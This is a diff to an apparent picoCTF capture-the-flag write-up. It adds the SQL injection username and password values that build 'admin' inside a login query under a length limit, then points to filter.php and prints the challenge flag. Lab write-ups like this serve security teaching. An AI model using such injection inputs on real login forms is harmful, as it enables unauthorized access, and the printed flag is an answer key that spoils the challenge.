@@ -34,6 +34,11 @@ The actual query string is below: `SELECT * FROM users where username='admi'||(C
 **Note:** This chall requires the sum of length of username and password **< 35**. In some case if our payload's size is too large, we should  decrease it by omitting redundant characters in **password** or instead of string, we should move to calculate with number. 
 **Note:** May be  using **division operator** (In this case is `1540/LENGTH(' AND password=')` for more easy calculations.
 
+User: `admi'||(CHAR(12+LENGTH(`
+Pass: `)*7))||'`
+
+Then move to **filter.php** file to get the flag.
+
 #### The Flag (for reference): ✔️
 ```
 picoCTF{0n3_m0r3_t1m3_fc0f841ee8e0d3e1f479f1a01a617ebb}
